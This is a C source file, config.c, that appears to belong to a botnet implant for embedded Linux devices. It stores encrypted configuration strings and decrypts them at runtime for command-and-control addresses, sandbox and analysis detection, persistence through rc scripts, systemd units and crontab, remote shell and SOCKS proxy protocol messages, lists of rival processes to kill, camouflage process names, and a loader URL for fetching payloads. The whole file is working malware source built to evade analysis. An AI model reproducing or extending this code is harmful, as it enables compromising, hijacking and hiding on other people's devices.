/* ==========================================================================
 *  config.c -- Encrypted configuration blobs and on-demand decryption groups
 *  Pure C port of config.cpp.  GCC 4.1.2 / C89+C99, uClibc.
 * ========================================================================== */

#include "bot.h"

/* ==========================================================================
 * RAW ENCRYPTED BLOBS -- hex strings, identical to Go config.go
 * Patched by setup.py when keys change (re-encrypted with new key material)
 * ========================================================================== */

/* @encrypt:slice serviceAddrs */
static const char *raw_service_addrs = "b04c758d5f43f17aeaf0c85dc59ad122ecebbb62e47fe65a176f334d41d708e40c369aded0fd2dbf35b11c68ad9cffc6063ce92d5b3cfb7994c2156d02eda9a8ddada5cde8df4821108a394eb95c8c6979d1ae303faa81e833f4a6684f444047";

/* @encrypt:slice sysMarkers */
static const char *raw_sys_markers = "b000221edaea4d68a1d8f342c5f281fb14d7ce9966568f6e09456c17e155c63ce31a10caaf707a2622dbf248c6faf1bc143cdf1054bfb9ce9ae595079be8a934d495a869162837e5aaeddefea5e1f9f16d529a9473df521a87775b48cc39b5dace71b78a3b4bdf9e76fdf07fc76e1065db8f0b47940ca084bc99e20704c2fcdb52f78c8a431e33267a2f8046f40c34cf222794b84963";
/* @encrypt:slice procFilters */
static const char *raw_proc_filters = "a583c54a50efea644b4aaa9922e2d5db7d6aa76fb7f3e7e7dea0e7357fdcdb60135f4f2bf1ab62e3ee2a6fc768c69f6b708fffb1fce908d9e406bdcca5534fdc0a5fd873d53b415c807fe7f3263bfd13d71783758a880d0a83cc592d0a2a709f3404f8e2609c0a61e82bd778ec83f292602acf9ea48205ae724b6c869d9bfb69ff7f570b1db781f0267a4860b7772b3154b64d279906b1558bb99506527292bb28d46edb58d1d3965fe55bc4b248f948b2b26316badce072f103b7da2987d299dd554a8d2216504f9bc66b1ec56b9c9abd6b06bf26402c0978447c51e6c9510a189245afef3d99dc0980d1d156d8ab215acfa52e23c3a5be9065c55761254a79c52d24554054a110d19e076cc3154c7cae691e6cb1197b342bcf50d58d5d68c6c8246ed6bcde477fd93ee6eb8f253a83a5f8613a2c7b8c4e81e0260afdca9c622c06ba4b6b7dcf248aa2ed488c9af69790fe5fb11668b694b6e24c5a1f83ca4c3cb11906bca840280484bc39170959ce3a38400db8c6eb67fd6eb94fe3fa1dea866930e8897a0f178103f1cea72a7d034130f74a8164ce7a153c96592264449936fa85560395fddc3899b16d5a16701ca3d4fa3092fb6a449bfae4e8ea9cf4a875b0c9665824f4dc768020bac89e69eb356761b504aea327aea1b35580c0dcd6b2b819fbc67f9f3438c94fd896a21f6da720ffd1a583dc990d8cb74febfbe7bde0ead7a998ad21b008d7098b03068833e24099802399d0f7a37bfdae8f5002194fd1a94dbf7fe6c531ad4ecbda42df24c9a3ad5e3c1f812369e925f9152149a9438f7af50143495c519b967b8d0a321fe00bd4721ebb7e9cc1a9c2592715f54655f84d14f10a5cc7be3aca28766544e4a1d2ba3a7726858456d032802967a7f1662c91398dd134228381997eec94219917cfb94856aeefb6382d60231c12f377486e774ca8b866a0c0edc6194230501f52d2b9495bb9db57b1edd6d344330a115c83ad84773cead3d54896acf4579981260d9bc4d2dff7e018ac599d0c6f8b0dfce8a0768ea2d60dc08e1832dda0343a56a76ce6023596861786160788c5c8b659fea108a5f05ed3b452e4603ebfa6b165896e1935c85ea6a43f22cdf01bace17efff51559cd9bbd849f1e263fe19b7265a8761491fa9d7cdcf3eaf0bcdcf56911e92891c31f616492b8815cc54b891fff2554bfd135";
/* @encrypt:slice parentChecks */
static const char *raw_parent_checks = "8a7658fc6de65f3ca522d0ea301f616f6e4dc5412ab9a4e86a9aa8707e526bdfef3a6dd6d497e71b38eed575684b36a2e846c4522e35861438a92ba8c6225c09b48c84ab7e54b71926b78b7b418804f9e1ce156a6535b913d22373874d4f4a4abf732939e4494eb4095df6dec119ad6a557256783107fef4c6272c520d10daffe4eb32768026eb9be670cb7c1e8e3077c854ce788be1899b";


/* @encrypt:single -- persistence paths */
static const char *raw_rc_target = "6fd35ebf7d06bf5ffec2856a3c1671e20fb14e444c3ca8884550a93ad3a117f9c7313ad9f477fa33c30c2f411548b43c6be9009e61dfcf65d4";
static const char *raw_store_dir = "f480162798d53e7feb4704df7ce6cb872537be9361678ad4a11d18776e4fcb2fc57b1cd29cc673f48f7aaec08081d21ebb899d2ed528b09aa4ce7cba1a9f95eaa09f5f8ddd";
static const char *raw_script_label = "849778b19f444cbf0b6cc4e57f0f98c16ab55a3529b2f95af48c7c3da4bc2f4dc5a0e9413a4b4b77000692d5e1d1772eec7ff0f65fd2e89071cb27cf10b4322857";
static const char *raw_bin_label = "bfda011ff399dbac840dba1145b016db1426c8ec71e6c5b2351c7ddc61806d9887bf902a7e26ee4b2262d5fe3fcc9516cbcc07f8d527678ef80062";
static const char *raw_unit_path = "c92c9baaeccc2222e83c52cbd39acf41caa1297c38369db8e0ec6c3dc9f315a54a6edb1aa338d953b93e90f25b6ec5f89548c45d9defd8cd35cdef066d63f6c15a2056575f963a48017fc5592d58a3b942b84c9beeed";
static const char *raw_unit_name = "946dfe60b5ac43b63679f5c0720d48648e5a6841b002f71cd7094dbaa75bc34f87885658192edfce7c6c10bcda10a794035c8ac819913a8c34c7cf8a63c1536b448b";
static const char *raw_unit_body = "f565a4bdaaa5a70ae66ffe3d24062041248e3fe6920316c79853132f8734d94ffaa003c11d2aae5e1547b15205a0f764426dda68cdece0260058707430c317a722d6b33524b71760ba7e1b4fe9dbfd872fa270e6602240833ed301173fd7c081577ae17e53d456c7662b3132a1fab9fe22e0a126113b3e2a72109af0e39e272fd5bc754bf7fce0b64c3ae96900abb73facbc58ae05d5c1c1db49b99df7824df7d82b37aee76dae19dbafb5c0a0b13699e7763cbb46e5af64a49544b8a3f18b2780e2f4ac26715727798e1fb6e747fc3f5bfbefd94b0f17d3388a1a3f0a1dac39dd2f78d985d35a927571";
static const char *raw_tmpl_body = "ba26c1915884915d244fb8f9cdc695093905813c1eb6a8e72e23a8a72f58d724c55b062d3fbaeada01983e7370c061a55cee63367ac18622e5510ca698e9b14c6a346ee1f74c75ed6d3a9898af5d4af32f3be71f71550b03fb7af15e212244c6463dde8460a611c9cbe7b0178fb021920c42a7b7de0f67558107365a1d515c021e96dca3fd0b333aaeeb234e88734c2ed12eff3a0994618dfd0328f5fd572b492d0f01de031621b0e4361d41fcd0a249e37d6e510ddc0da26b3aa605b60b24f022b971e61978303c9766cc8a6d9622dfecfbe432bc419b7bccee84bb8acae41b95";
static const char *raw_sched_expr = "c8e52d9803e53f014bb312e5d0706fb1f8a4be1d9f38419bc243d3aae2568b6a0f61c65701e886441ead1c72c74b0fff4e2e99a4493740";
static const char *raw_env_label = "df5e8ef6fa12b591fe8b6878432e2a7744bad65fe9f15d6e595e3f680f4d9875151e20d4608b66c71a05fcefd0847e279a07330591da4faa37";
static const char *raw_cache_loc = "888b0693b5da10feedee166770e69157f3b1f4efcbf6e95ecb54cb55debd02784f79551d5484d20560c49219a23b66e9caa8689cb14aa508894dea636451";
static const char *raw_lock_loc = "6857ef91db19066d3c6296097822988348b72fe77e78c4042e9bd04cae23a9f0e396b1d2b4455a71038ec75e2f2a9a57bcb6bb1840126747eb9395ea8919e6de5852";

/* @encrypt:single -- protocol strings */
static const char *raw_proto_challenge = "7d4f4d3732dd9eb930002ceb2e83d9b1c8e5c2cd9dac6d5d44c06b4d66657e525d948dd6637256faaaa8b9ad061a2ab4f21d6c03fd1c61c2dcb121";
static const char *raw_proto_success = "c964d89afc91c4cff66b1fdd1cd855aa808a18ce2e1af97cd3042d7e08bb84b1d75838c824a4e88e4eb5f251c4987bcacd6464f44c49fc59";
static const char *raw_proto_reg_fmt = "95ed4a2be27312153af008b5ec03786d3c2b8d3321f2a95e21bb104755c5470bbbd027c862e3159bc69ebe0969b7e2ff46afe9d5359312945a015275c0033b5ec4fa06e7cde011b83f060cdb";
static const char *raw_proto_ping = "581af985e2a2c56fed22b111e9311a25520313a8568e6172be0fd657befe84b4b3fb563b7313a801c80a7747bc704acea5";
static const char *raw_proto_pong = "a327d4da55d1ff2d85e4f4a1563998770fc140cb603137dac233ea1b520c8eec7781df6054d1d4e9cca499c3c9491dad3e";
static const char *raw_proto_out_fmt = "7ea31d7dd5a10bb7bf84ca2997f074b18726bc39a991d9adcd801bccc9e5e1e2bd2c318b7669d39c1781287d885ebaa585546fd779a7e00660ae";
static const char *raw_proto_err_fmt = "85f42071382b64d5c3cbd4d4f6eb398277d62f74229e377df0972d72aa4809c67f4146517db150fc4fe99b743849bcb33d09f876b5";
static const char *raw_proto_stdout_fmt = "3043b2963a1c84729e6ea3ac466abc9fc0b1f0793f3591ff7666a0f2fd9be7c416af4f9dfc7a486e8e22a0e48bfdf8ff1db4a1f824b3";
static const char *raw_proto_stderr_fmt = "0a5c53e4f77ab4c610326cedccff083c0a056bbdf3b4422205c49a18496f6ffe07c35f4046619967bf5df9759b1cc41abb046803efaf";
static const char *raw_proto_exit_err_fmt = "1fecfa9ab83efafcf9e5371e12711b7456de630dd41fd71a1318f92905e610f62d80f06a8ba08945cc529d3386aad88cb36e6beb56471841";
static const char *raw_proto_exit_ok = "49134b29f68e5be9bdc2e91ab5b18836ae4c5effe52bab1f89ceef1187ea6d673cadd849edaf3cda9c518a60fa0d0f46be2c06f1777419fdbd70177814620ff47aca9a2683672fd2c24a1cadffac5cc5c0426e";
static const char *raw_proto_info_fmt = "33887447e157d197103a9f1c10984677f57f03e726e6605956fdf13c06ece5a98ec9d63d9f96650553852da8f69689a2ad55f92b";

/* @encrypt:single -- response messages */
static const char *raw_msg_stream_start = "088967c303c0c960f9aaf0d6cccd01db4443f15b7a9c035f4d2147c706c8ae0b058fd4229aca22ba705e68092fa6e93b8840f8f99499f2c9486134bec6";
static const char *raw_msg_bg_start = "1b9079323f868aa3e92e8ac0f39b8e5f5037f71870827c3186f586be842455645c5268a354de62bcf1d7d21ca8829eeac447b43128373b697c758cb55763eea370ca3335eea74354";
static const char *raw_msg_persist_start = "66839b375e6d6ddcdaaab1fea48260d5fb359045a64fc117cdab3cf89061be72da9382cf2ce6ba22550fdedce581af7b325581f2049d9acfd749b069e531537247350f4760280617acde2c12";
static const char *raw_msg_kill_ack = "a2011f385beea20c8f187c8b579837dd8af351e29f933b01a8bf0164e749ac98cf680b77bb4738b64bd38c94bdb2183f23098fc8c3f6951a56e320ce10b161997dcdea937222f03cc7340023";
static const char *raw_msg_socks_err_fmt = "fb83a558bff79c065cb8048692ba9d26bfcf59077dceec48c6a10d6b930a74b2a4faace9a702a825c035544967d2ca2575810ef6cc0013f7b049f56f3f17";
static const char *raw_msg_socks_start_fmt = "a2182c7a612f346dedd03c9aaf8be87a7b075aed6e2f5612b6185124843b0a1a80fccd54dfff0c54377de898a28e5889c5c3c9ea0226ffe6df6b7b88b8079387e6c2";
static const char *raw_msg_socks_stop = "4d60ecebd8ff86f5ac0c4d14b534e793f48ad3ce9cf51506d834ff02a911ff1129cf0ffe4087e8a67939dd83cf390123841f56a60cbbcbbb23e10995355096ed834a";
static const char *raw_msg_socks_auth_fmt = "0b15634ff8edbd730cb249e8e6e0acda345e330b756da011ae251745f62b4a2da26b034757a2ea8bd86b4b9e9a7d79912f7e094772f043e7925f807cba106781d8094d";

/* @encrypt:slice -- DNS / URL infrastructure */
static const char *raw_doh_servers = "f47c23f98502274fb4c7080313a72a0affe96ee2486a5543dd4429f19e79172ab40cdfc33f6ddfea71bc3c902adcd64429d106448086815b648a6bf215259f8da269a5eb3840d6e1f0dba510d940bc280720e5c9268a1d59df629ed79b35ba5f86697f1a21b98d6003dcac89185bc2f2d9b2094de61d8378c447b482a5c34b9afbae022e511ecfaabdf177de097835ec28f2";
static const char *raw_doh_fallback = "00efa30bb05cb85291b6d9f0037f74368470054bb36ade73d5be121b4d1eff99516b3886785d8e464c77d23b0ba950ebad3f298c778ef1a85db4a42db824fe83bfb7aa6a671baf9722e4eddf793184789b1a12c511f61f49f19270f22b4000225297f8d69e25aaf3a0a980";
static const char *raw_resolver_pool = "ad823b7a1cb20076562aa4795e4a7e620fc2cd2612cb607a0c34e30887c01e37def7e0611dd8e1e7ec6d2dbd3835ff796aa28adf0f0200b4649777ef30f86bd814b401a37932ae5c5dc0063f2ea21256ac36e72c5684eae5902452319032";
static const char *raw_speed_test_url = "8bc2c6acc5390aa1b3b43c35af113aec18a116cb13b45378b9e9b913d1b8c585c0757395bd9ce27f123c1adb63f902d870a773bbebf37d31b5c610c79ce22ec53b16de4f198cbd4ee06ebd32c345c583b6d66aedd259fa1e3a48e355";
static const char *raw_dns_json_accept = "fde21eead9ce45625c8b7701795a9e869fccb6139d2be65e2e0016c267fe72582e5e857ce6b77c76a3e5c0474b799db631ce60087a1a4014285b22af2a88b7b9";

/* @encrypt:slice -- opsec / killer */
static const char *raw_sb_names = "fb54a2284005d0f786c51f86374555b3aa2d0bb128acce1c74973240072d42213fc18a7db6223d792120d55ef90ed586ad0bebefb75aa714965ed433fa8cac041e76f1532c7e21d3454ba3810ac33af18a6baa72cbebdb3fc89cd48a1f742382db8d9d92c00dce8399d4dfe2fcacf0b5b066538f7f6445dc529daa25eb9aed64cf716130453907eeb9605ed22a191417d574af0ecf";
static const char *raw_kill_patterns = "659cc487a4bc23fa250354c7019d0a25310d071e1fc0454d2f71d326296a91fc9da7d3d47898c63ade95bdb8a57224b416941e4a4f15ddd56d881369efd4285d132eb8c53740f7adb421694fe4e1a4a14182ef82fb2734146bc00d3d89f62d62032f09f0ec8a066e20b131bae577d2efbc903427d0b57028484168d5c361dc29931c88e884b2553cea3099dd728ecc23137219d67b304166979cc82cd07f78ec3330ac42d8fc062bc76d62ddaac516ad4c969f86aeb7eca3b248cfc849b84de29102083e35b3297034706bc6aad4c83fbb66bd1fb74727ce957ab7797e7313690c6655447baba9d2e3013ed4d7f6f67605328ca7bf9310831ba12496e324331edac1bb730846e46e2625ff2680cff83e9ea3c87b03af4e13a05fa315de87f5e1726a1e667b93021ca220b8974514e3471c0729eff4d18ff48a31842bf6afeccfb64f1e729ad5db86a7ba00d730a0cb4262dc3bd4ccff0333910e187c0fbc3745dd8b0b2e8548d11537b6bb1717a8e223320e9f60f0b3b3cfb9f94b5fb9812630450856b566f759df4b712c8096c79c61d7d12aeb629b0c776d7bb169bd9005ff675e55b828df8d2cceca99a297f9ba142a1f844da72edbfdfea01cc1d64e5b96bfc504c686a39f4ce7016b9a8320dc1f12412d9889e1d2b41a976eabb7ba348a1183a9fe9fc7a27ffe8cbee28f7b34194be2bad66e5206e80ce9e12e0bad42671b4704a1689d78e8261a48d1b2697b12fd56bd5c1fcc3783277f7e9b8985134025d03429ed35e16376ddf5551cc4b0b77c5df1ff44b21b86f2ff5f9b22f7adf1c3345ac200792620856026ceec2cfc7454a17ce8b22147e9c00d2ae1f7e243eb85d0595607dcc350591893a21592e5c2d09f4da4517ae008b4a1d403ae50ae74114a6402e2cf38d78833ba2d22e93798a56fac68dd85e84ab844c166bfaa6499e2c992d5a1ed96710dd5b19d0496";

/* @encrypt:slice -- camouflage */
static const char *raw_camo_names = "49f83bb8538d55c490eed5d08a9752c58019b0a6d64902f96f7a8726a7ee905c48e545a9ea248ec5a0c82ca5f7a30115dc6e216bcbd16b399ac07b5e1570c3ac3f841b5f49b9a307aae8531941b761e8a91672122ff7607cb80c8514cbfd41b4efcee29507844a";
static const char *raw_shell_bin = "05998dfe1c290a625131d7be228b444c99177e52271384d13bc9fbe891d25d669508de19d4dbeb3314650e6e7ce522d44c6a1a";
static const char *raw_shell_flag = "552bf3371e477e627896c86cdb3023948ed70ac745f62fca6d60f45e004f0203c7cfdad9be84cda180e86f983e4b";
static const char *raw_proc_prefix = "2793c4b9903348d6755d4109d525f8908617d9303d3ba018f393bd74d6a176717a78af319ec3b91d5a4a291d41379f6cd8ff";
static const char *raw_cmdline_suffix = "f6564e6d43c593d724f4e14a16084e8797649885afac29ba6de8a3ce44cf0cfe7a6dca6ea98dab4a7a469643932956e9211ff090";
static const char *raw_pgrep_bin = "a4fa092f3b9cebc8c272ee8faf821072e547eaebcfac0d3a5b59ac22cf1844891f8311056574a7cf781be0f5fd830fc940eb3646f10771c161f8";
static const char *raw_pgrep_flag = "f742349b99d917e6d709ec6bd7ea087db2e229132ba9621358592a834bf11922b41828ad555dcd41513083ab7aa0";
static const char *raw_dev_null_path = "f10e303fcb9ce661b6d6d311eecd94dc03fc3e729193014cf3f8da0584527b005da257835ddb23a5fa46645bb68e0729bcfe950f2f";
static const char *raw_systemctl_bin = "62b714cdc14b0baae5c4df01f2e5c7a79f5a41f0f4b662b0522ed47905671f2a6bc0745e491fb50e791f07d64b3b411bed291c2ec857ec070808";
static const char *raw_crontab_bin = "4a2dc8fabe404caa7eedd7489fa874104264393ce3a09ad579d4051e94a5043d0cec22cbbd842cd46ee831ec64a35ffff1ef0e8e21f39b802ab8db42";
static const char *raw_bash_bin = "edacdf0bcd9994829455632a6a1964c1a9e20d73dd136afaa8285aa9660f08db88feaf5cb24cd45a067eefeb586f3c23188d494686";

/* @encrypt:single -- loader & bins server (patched by setup.py) */
static const char *raw_fetch_url = "ac872723e95d275d168e1a915cd9e8954bd9fd5d7072fec717dfce01f8d8e03e30d298a9e2a2bd5d58e976ed289463148ba2bfa731562f9fe86eb698f1403994bc6857e4d73cfda003";
static const char *raw_bins_host = "02f4ef62f0cf53ce29fcc4dd4ac33f8e5f267af1d86b8c89219097d6b53bb1f51e0232bea95129febcf8a7578f0056ce1afda7cf5d778a41e1b8";

/* Decrypted at runtime — used by scanners and persistence */
dstr g_bins_host_str;
const char *g_bins_host_ptr = "";

/* ==========================================================================
 * HELPERS
 * ========================================================================== */

/* Decrypt a hex blob to a dstr (single value) */
static dstr decrypt_single(const char *hex_blob) {
    dstr result;
    dbuf blob, pt;

    ds_init(&result);
    if (!hex_blob || hex_blob[0] == '\0') return result;

    blob = hex_decode(hex_blob);
    if (db_len(&blob) == 0) { db_free(&blob); return result; }

    pt = dual_decrypt(db_ptr(&blob), db_len(&blob));
    db_free(&blob);

    if (db_len(&pt) > 0) {
        ds_setn(&result, (const char *)db_ptr(&pt), db_len(&pt));
    }
    db_free(&pt);
    return result;
}

/* Decrypt a hex blob to a strarr (null-separated values) */
static strarr decrypt_slice(const char *hex_blob) {
    strarr result;
    dbuf blob, pt;
    const char *s;
    size_t total, pos, nul;

    sa_init(&result);
    if (!hex_blob || hex_blob[0] == '\0') return result;

    blob = hex_decode(hex_blob);
    if (db_len(&blob) == 0) { db_free(&blob); return result; }

    pt = dual_decrypt(db_ptr(&blob), db_len(&blob));
    db_free(&blob);

    if (db_len(&pt) == 0) { db_free(&pt); return result; }

    s = (const char *)db_ptr(&pt);
    total = db_len(&pt);
    pos = 0;
    while (pos < total) {
        /* find next NUL or end */
        nul = pos;
        while (nul < total && s[nul] != '\0') nul++;
        /* push substring [pos..nul) */
        {
            dstr tmp;
            ds_init(&tmp);
            ds_setn(&tmp, s + pos, nul - pos);
            sa_pushds(&result, &tmp);
            ds_free(&tmp);
        }
        pos = nul + 1;
    }
    db_free(&pt);
    return result;
}

/* ==========================================================================
 * ON-DEMAND DECRYPTION GROUPS (pthread_once = std::call_once)
 * ========================================================================== */

static pthread_once_t s_boot_once    = PTHREAD_ONCE_INIT;
static pthread_once_t s_sandbox_once = PTHREAD_ONCE_INIT;
static pthread_once_t s_network_once = PTHREAD_ONCE_INIT;
static pthread_once_t s_proto_once   = PTHREAD_ONCE_INIT;
static pthread_once_t s_persist_once = PTHREAD_ONCE_INIT;
static pthread_once_t s_killer_once  = PTHREAD_ONCE_INIT;

static void init_boot(void) {
    g_env_label     = decrypt_single(raw_env_label);
    g_dev_null_path = decrypt_single(raw_dev_null_path);
    g_cache_loc     = decrypt_single(raw_cache_loc);
    g_lock_loc      = decrypt_single(raw_lock_loc);
    g_fetch_url     = decrypt_single(raw_fetch_url);
    g_bins_host_str = decrypt_single(raw_bins_host);
    g_bins_host_ptr = ds_cstr(&g_bins_host_str);
}

static void init_sandbox(void) {
    g_sys_markers    = decrypt_slice(raw_sys_markers);
    g_proc_filters   = decrypt_slice(raw_proc_filters);
    g_parent_checks  = decrypt_slice(raw_parent_checks);
    g_proc_prefix    = decrypt_single(raw_proc_prefix);
    g_cmdline_suffix = decrypt_single(raw_cmdline_suffix);
    g_pgrep_bin      = decrypt_single(raw_pgrep_bin);
    g_pgrep_flag     = decrypt_single(raw_pgrep_flag);
}

static void init_network(void) {
    strarr addrs;
    size_t i;

    addrs = decrypt_slice(raw_service_addrs);
    for (i = 0; i < sa_count(&addrs); i++) {
        const char *raw = sa_get(&addrs, i);
        const char *start, *end;
        /* trim whitespace */
        start = raw;
        while (*start == ' ' || *start == '\t' || *start == '\r' || *start == '\n') start++;
        end = raw + strlen(raw);
        while (end > start && (end[-1] == ' ' || end[-1] == '\t' ||
               end[-1] == '\r' || end[-1] == '\n')) end--;
        if (end > start) {
            dstr trimmed;
            ds_init(&trimmed);
            ds_setn(&trimmed, start, (size_t)(end - start));
            sa_pushds(&g_service_addrs, &trimmed);
            ds_free(&trimmed);
        }
    }
    sa_free(&addrs);

    g_resolver_pool   = decrypt_slice(raw_resolver_pool);
    g_doh_servers     = decrypt_slice(raw_doh_servers);
    g_doh_fallback    = decrypt_slice(raw_doh_fallback);
    g_speed_test_url  = decrypt_single(raw_speed_test_url);
    g_dns_json_accept = decrypt_single(raw_dns_json_accept);
}

static void init_proto(void) {
    g_proto_challenge   = decrypt_single(raw_proto_challenge);
    g_proto_success     = decrypt_single(raw_proto_success);
    g_proto_reg_fmt     = decrypt_single(raw_proto_reg_fmt);
    g_proto_ping        = decrypt_single(raw_proto_ping);
    g_proto_pong        = decrypt_single(raw_proto_pong);
    g_proto_out_fmt     = decrypt_single(raw_proto_out_fmt);
    g_proto_err_fmt     = decrypt_single(raw_proto_err_fmt);
    g_proto_stdout_fmt  = decrypt_single(raw_proto_stdout_fmt);
    g_proto_stderr_fmt  = decrypt_single(raw_proto_stderr_fmt);
    g_proto_exit_err_fmt = decrypt_single(raw_proto_exit_err_fmt);
    g_proto_exit_ok     = decrypt_single(raw_proto_exit_ok);
    g_proto_info_fmt    = decrypt_single(raw_proto_info_fmt);

    g_msg_stream_start    = decrypt_single(raw_msg_stream_start);
    g_msg_bg_start        = decrypt_single(raw_msg_bg_start);
    g_msg_persist_start   = decrypt_single(raw_msg_persist_start);
    g_msg_kill_ack        = decrypt_single(raw_msg_kill_ack);
    g_msg_socks_err_fmt   = decrypt_single(raw_msg_socks_err_fmt);
    g_msg_socks_start_fmt = decrypt_single(raw_msg_socks_start_fmt);
    g_msg_socks_stop      = decrypt_single(raw_msg_socks_stop);
    g_msg_socks_auth_fmt  = decrypt_single(raw_msg_socks_auth_fmt);

    g_shell_bin  = decrypt_single(raw_shell_bin);
    g_shell_flag = decrypt_single(raw_shell_flag);
    g_bash_bin   = decrypt_single(raw_bash_bin);
    g_camo_names = decrypt_slice(raw_camo_names);

    /* Initialize default proxy credentials if not already set */
    extern const char *default_proxy_user;
    extern const char *default_proxy_pass;
    if (ds_empty(&g_proxy_user) && default_proxy_user[0] != '\0') {
        ds_set(&g_proxy_user, default_proxy_user);
        ds_set(&g_proxy_pass, default_proxy_pass);
    }
}

static void init_persist(void) {
    g_rc_target     = decrypt_single(raw_rc_target);
    g_store_dir     = decrypt_single(raw_store_dir);
    g_script_label  = decrypt_single(raw_script_label);
    g_bin_label     = decrypt_single(raw_bin_label);
    g_unit_path     = decrypt_single(raw_unit_path);
    g_unit_name     = decrypt_single(raw_unit_name);
    g_unit_body     = decrypt_single(raw_unit_body);
    g_tmpl_body     = decrypt_single(raw_tmpl_body);
    g_sched_expr    = decrypt_single(raw_sched_expr);
    g_systemctl_bin = decrypt_single(raw_systemctl_bin);
    g_crontab_bin   = decrypt_single(raw_crontab_bin);
}

static void init_killer(void) {
    g_sb_names      = decrypt_slice(raw_sb_names);
    g_kill_patterns = decrypt_slice(raw_kill_patterns);
}

void ensure_boot(void)    { pthread_once(&s_boot_once,    init_boot); }
void ensure_sandbox(void) { pthread_once(&s_sandbox_once, init_sandbox); }
void ensure_network(void) { pthread_once(&s_network_once, init_network); }
void ensure_proto(void)   { pthread_once(&s_proto_once,   init_proto); }
void ensure_persist(void) { pthread_once(&s_persist_once, init_persist); }
void ensure_killer(void)  { pthread_once(&s_killer_once,  init_killer); }
